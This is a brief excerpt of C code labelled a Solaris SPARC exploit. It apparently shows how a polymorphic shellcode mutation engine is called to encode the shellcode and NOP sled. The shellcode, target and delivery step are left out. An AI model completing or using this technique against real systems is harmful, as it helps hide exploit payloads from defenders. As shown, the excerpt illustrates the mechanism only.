/* Solaris SPARC exploit, (uses API) thx cheez */
...
main(int argc, char *argv[])
{
  ...
  printf("NOPLEN = %d, ADDRLEN = %d, strlen(shell) = %d\n",NOPLEN,ADDRLEN,strlen(shell)); 

  init_mutate(mctlp);
  apply_key(buf, strlen(shell), NOPLEN, mctlp);
  apply_jnops(buf, NOPLEN, mut);
  apply_engine(buf, strlen(shell), NOPLEN, mut);
